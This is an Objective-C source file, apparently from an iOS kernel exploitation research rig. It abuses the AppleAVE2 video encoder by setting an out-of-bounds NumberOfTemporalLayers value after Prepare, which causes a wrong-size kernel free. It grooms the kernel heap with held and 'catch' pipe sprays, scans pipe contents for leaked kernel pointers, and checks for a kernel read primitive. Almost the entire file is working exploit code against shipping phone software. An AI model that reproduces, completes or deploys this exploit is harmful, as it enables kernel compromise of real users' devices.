//
//  P149T8150Krw.m — the 17 conversion TAP. p149.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Ghidra 24A435 AppleAVE2 913.43.1:
//    queue_init FUN_fffffe000872b180  stp x0,x0,[x0]; str x0,[x0,#0x10]; str wzr,[x0,#0x18]
//    ctor FUN_fffffe0008840f78 / dtor FUN_fffffe0008840fec
//      queue_init(this+0x58) and queue_init(this+0x78)
//      then kfree(this+0x50, *(uint32*)(this+0x48) << 5)
//  Nov 1 panics: this=1, FAR=0x59 = failed alloc, NULL-page write.
//  v6 law: Prepare with N=8 (real pool) THEN Set 16463 THEN encode
//  THEN invalidate so the destructor runs on a live object whose count
//  may be the overshoot (wrong-size free of count<<5).
//
//  Neighbor = kernel pipes (default 16KB), unique markers, held for the
//  whole tap, plus a catch spray after invalidate. Metal 0x4000 (p145)
//  is the wrong zone for this object.
//
//  HONESTY: PIPE-HIT / QUEUE-INIT / kptr leak = write receipt, never
//  hasKread. commitSlide only on kread32(kbase)==0xfeedfacf. No kfd
//  pipe body, no SocketKRW.Arm without an inpcb KVA, no icmp6filt.
//

#import "P149T8150Krw.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <errno.h>

#define P149_BUILD     @"p149-t8150krw-v2"
#define P149_KEY       @"NumberOfTemporalLayers"
#define P149_PRE       8
#define P149_OVER      16463
#define P149_SURVIVE   16462
#define P149_PIPES     96
#define P149_CATCH     48
#define P149_MAXPIPE   (P149_PIPES + P149_CATCH)
#define P149_BUFLEN    0x4000
#define P149_MAG_BASE  0x5031343900000000ULL  /* "P149" */

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P149R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p149_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static void p149_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p149", arms, 1, &sr, 0, "p149 t8150 krw auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p149", 0, outcome);
}

static int p149_kshaped(uint64_t q) {
    if (q < 0xfffffe0000000000ULL) return 0;
    if (q > 0xffffffefffffffffULL) return 0;
    return 1;
}

static long p149_read_knob(NSString *docs, NSString *name, long def) {
    NSString *s = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:name]
        encoding:NSUTF8StringEncoding error:nil];
    if (!s) return def;
    long v = strtol(s.UTF8String, NULL, 10);
    if (v < 0) return def;
    return v;
}

/* Conversion TAP: 0 = 16462 survival; 16462..16464 = truth battery;
   anything else (including the leftover p142_layers.txt=18 from the
   09:06 / 09:55 HOLD taps) is forced to 16463 and the file is healed. */
static long p149_layers_knob(NSString *docs) {
    NSString *path = [docs stringByAppendingPathComponent:@"p142_layers.txt"];
    NSString *s = [NSString stringWithContentsOfFile:path
        encoding:NSUTF8StringEncoding error:nil];
    if (!s) {
        Lf(@"[*] no p142_layers.txt — layers=%d (PoC row)", P149_OVER);
        return P149_OVER;
    }
    long v = strtol(s.UTF8String, NULL, 10);
    if (v == 0) {
        L(@"[*] p142_layers.txt=0 → 16462 survival control");
        return P149_SURVIVE;
    }
    if (v >= P149_SURVIVE && v <= 16464) {
        Lf(@"[*] p142_layers.txt=%ld (truth battery)", v);
        return v;
    }
    Lf(@"[heal] p142_layers.txt=%ld is in-bounds leftover — forcing %d.",
       v, P149_OVER);
    L(@"  1..16461 cannot hit the 16463 OOB (this TAP 09:55 HOLD).");
    L(@"  Writing 16463 so the container does not demote the next tap.");
    [@"16463\n" writeToFile:path atomically:YES
                   encoding:NSUTF8StringEncoding error:nil];
    return P149_OVER;
}

@implementation P149T8150Krw

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p149_t8150krw_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p149 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P149_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] 17 conversion: Prepare N=8 (real AVE Surface Pool) THEN");
    L(@"  Set NumberOfTemporalLayers=16463 THEN encode THEN invalidate.");
    L(@"  Ghidra: dtor FUN_fffffe0008840fec queue_init(this+0x58) then");
    L(@"  kfree(this+0x50, count<<5) with count at this+0x48.");
    L(@"  Nov 1 this=1 FAR=0x59 = failed alloc. Prepare-first is the");
    L(@"  real-context door. Neighbor = kernel pipes, not Metal.");
    L(@"[!] PANIC-POSSIBLE. ONE tap per force-quit. Reboot after.");
    L(@"[honesty] PIPE-HIT / QUEUE-INIT / kptr = write receipt.");
    L(@"  hasKread only on kread32(kbase)==0xfeedfacf.");

    long pre = p149_read_knob(docs, @"p142_pre.txt", P149_PRE);
    if (pre < 1 || pre > 8) pre = P149_PRE;
    long layers = p149_layers_knob(docs);
    Lf(@"[*] knobs: pre=%ld (Prepare) layers=%ld (overshoot after Prepare)",
       pre, layers);

    /* ---- stage 1: kernel pipe spray (held) ---- */
    int rfd[P149_MAXPIPE];
    int wfd[P149_MAXPIPE];
    uint64_t mag[P149_MAXPIPE];
    int npipe = 0;
    uint8_t *page = (uint8_t *)malloc(P149_BUFLEN);
    if (!page) {
        L(@"[-] malloc 16KB failed");
        p149_bandit("nomem"); return P149R();
    }
    memset(rfd, -1, sizeof rfd);
    memset(wfd, -1, sizeof wfd);

    for (int i = 0; i < P149_PIPES; i++) {
        int fds[2] = { -1, -1 };
        if (pipe(fds) != 0) {
            Lf(@"[s1] pipe[%02d] failed errno=%d (holding %d)", i, errno, npipe);
            continue;
        }
        uint64_t m = P149_MAG_BASE | (uint64_t)(unsigned)i;
        uint64_t *q = (uint64_t *)page;
        for (size_t j = 0; j < P149_BUFLEN / 8; j++) q[j] = m;
        ssize_t wn = write(fds[1], page, P149_BUFLEN);
        if (wn != (ssize_t)P149_BUFLEN) {
            Lf(@"[s1] pipe[%02d] short write %zd", i, wn);
            close(fds[0]); close(fds[1]);
            continue;
        }
        rfd[npipe] = fds[0];
        wfd[npipe] = fds[1];
        mag[npipe] = m;
        npipe++;
    }
    Lf(@"[s1] spray HELD: %d/%d kernel pipes x 0x%x (released at tap end)",
       npipe, P149_PIPES, (unsigned)P149_BUFLEN);

    /* ---- stage 2: Prepare-first then overshoot (the v6 law) ---- */
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, p149_flushCB, (__bridge void *)docs, &session);
    if (st != noErr || !session) {
        Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("nocreate"); return P149R();
    }
    L(@"[2] session created (HEVC 1280x720, stage9 mode)");

    OSStatus sUsage = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"EncoderUsage",
        (__bridge CFTypeRef)@1);
    OSStatus sRC = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"RCMode",
        (__bridge CFTypeRef)@20);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanFalse);
    CFStringRef key = (__bridge CFStringRef)P149_KEY;

    int32_t pre32 = (int32_t)pre;
    CFNumberRef preVal = CFNumberCreate(kCFAllocatorDefault,
                                        kCFNumberSInt32Type, &pre32);
    st = VTSessionSetProperty(session, key, preVal);
    CFRelease(preVal);
    Lf(@"[2a] usage st=%d rc st=%d SetProperty(NTL pre=%ld) st=%d",
       (int)sUsage, (int)sRC, pre, (int)st);
    if (sRC == -12900) {
        L(@"[law] rc st=-12900 = VT RCMode=20 property miss on this build.");
        L(@"  ntl st=0 = 27.0 still accepts the count (Nov 1 panics used this).");
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[2b] Prepare st=%d (real Surface Pool; this must not be 1)", (int)st);

    int32_t lay32 = (int32_t)layers;
    CFNumberRef layVal = CFNumberCreate(kCFAllocatorDefault,
                                        kCFNumberSInt32Type, &lay32);
    st = VTSessionSetProperty(session, key, layVal);
    CFRelease(layVal);
    Lf(@"[2c] IN FLIGHT SetProperty(NTL overshoot=%ld) st=%d", layers, (int)st);
    if ((int)st == -12900) {
        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check.");
    }

    {
        void *rb = NULL;
        OSStatus rst = VTSessionCopyProperty(session, key,
                                             kCFAllocatorDefault, &rb);
        if (rst == 0 && rb) {
            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                             kCFNumberSInt32Type, &rv);
            Lf(@"[2d] readback=%d (1 = VT store clamp; internal count still reaches AVE2)",
               rv);
            CFRelease(rb);
        } else {
            Lf(@"[2d] readback st=%d", (int)rst);
        }
    }

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("nopb"); return P149R();
    }

    OSStatus firstSt = 0;
    for (int i = 0; i < 4; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 0) firstSt = est;
        if (i == 0) L(@"[3] ENCODE[0] = overshoot on a prepared context (IN FLIGHT)");
        if (est != 0) break;
    }
    Lf(@"[3] battery returned; first st=%d", (int)firstSt);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    CVPixelBufferRelease(pb);

    L(@"[4] invalidate = destructor (queue_init + kfree count<<5) (IN FLIGHT)");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[4] session invalidated (clean return = survived this count)");

    /* ---- stage 3: catch spray into a wrong-size free ---- */
    int nheld = npipe;
    for (int i = 0; i < P149_CATCH && npipe < P149_MAXPIPE; i++) {
        int fds[2] = { -1, -1 };
        if (pipe(fds) != 0) break;
        uint64_t m = P149_MAG_BASE | 0xC000ULL | (uint64_t)(unsigned)i;
        uint64_t *q = (uint64_t *)page;
        for (size_t j = 0; j < P149_BUFLEN / 8; j++) q[j] = m;
        ssize_t wn = write(fds[1], page, P149_BUFLEN);
        if (wn != (ssize_t)P149_BUFLEN) {
            close(fds[0]); close(fds[1]);
            continue;
        }
        rfd[npipe] = fds[0];
        wfd[npipe] = fds[1];
        mag[npipe] = m;
        npipe++;
    }
    Lf(@"[5] catch spray +%d (held was %d, now %d)", npipe - nheld, nheld, npipe);

    /* ---- stage 4: scan pipes ---- */
    int hit_pages = 0, kptr_n = 0, qinit_n = 0, foreign_q = 0;
    uint64_t first_kptr = 0, first_this = 0;
    L(@"[6] scan: marker mismatch / kptr / queue-init triplet (3 equal kptrs + 0)");
    for (int i = 0; i < npipe; i++) {
        memset(page, 0, P149_BUFLEN);
        ssize_t rn = read(rfd[i], page, P149_BUFLEN);
        if (rn <= 0) continue;
        uint64_t *q = (uint64_t *)page;
        size_t nq = ((size_t)rn) / 8;
        int page_hit = 0;
        for (size_t j = 0; j < nq; j++) {
            if (q[j] == mag[i]) continue;
            foreign_q++;
            page_hit = 1;
            if (p149_kshaped(q[j])) {
                kptr_n++;
                if (!first_kptr) first_kptr = q[j];
                if (j + 2 < nq && q[j] == q[j + 1] && q[j] == q[j + 2]) {
                    uint32_t z = 0;
                    if (j + 3 < nq) z = (uint32_t)(q[j + 3] & 0xffffffffULL);
                    if (z == 0 || j + 3 >= nq) {
                        qinit_n++;
                        if (!first_this) first_this = q[j] - 0x58ULL;
                        Lf(@"[6] QUEUE-INIT pipe[%02d] slot=%zu self=%#llx this~=%#llx",
                           i, j,
                           (unsigned long long)q[j],
                           (unsigned long long)(q[j] - 0x58ULL));
                    }
                }
            }
        }
        if (page_hit) {
            hit_pages++;
            if (hit_pages <= 8) {
                Lf(@"[6] PIPE-HIT pipe[%02d] group=%@ foreign-qwords in page",
                   i, i < nheld ? @"held" : @"catch");
            }
        }
    }
    Lf(@"[6] verdict: hit_pages=%d/%d foreign_q=%d kptr_n=%d queue_init=%d",
       hit_pages, npipe, foreign_q, kptr_n, qinit_n);
    if (first_kptr) {
        Lf(@"[6] first kptr=%#llx (heap leak, not kread32)",
           (unsigned long long)first_kptr);
        [[P007Board shared] recordHeapLeak:first_kptr source:@"p149"];
    }
    if (first_this) {
        Lf(@"[6] derived this=%#llx (queue_init self - 0x58)",
           (unsigned long long)first_this);
        [[P007Board shared] recordHeapLeak:first_this source:@"p149-this"];
    }
    BOOL receipt = (hit_pages > 0) || (kptr_n > 0) || (qinit_n > 0);
    Lf(@"[6] conversion_receipt=%@ conversion=NO until kread32(kbase)==0xfeedfacf",
       receipt ? @"YES" : @"NO");
    if (!receipt) {
        L(@"[6] CLEAN pipes = fill did not land in this zone, or this=1 panicked first.");
        L(@"  A panic here is still the failed-alloc class. Survival + PIPE-HIT is the door.");
    }

    for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
    free(page);

    /* ---- stage 5: honest KRW self-test. never fake 0xfeedfacf. ---- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    L(@"[*] SocketKRW.Arm needs an inpcb KVA. AVE queue-init writes self-pointers,");
    L(@"  not icmp6filt. No Arm from a pipe leak.");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            (void)P007LaneArmBoard();
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx) hasKread=YES",
               (unsigned long long)kb);
            p149_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@) hasKread=NO",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p149_bandit(receipt ? "receipt-no-kread" : "selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
        Lf(@"  hasKread=%@ conversion=%@",
           brd.hasKread ? @"YES" : @"NO",
           brd.hasKread ? @"YES" : @"NO");
    }
    Lf(@"=== p149 end %@ ===", LabLocalMilitaryNow());
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return P149R();
}

@end
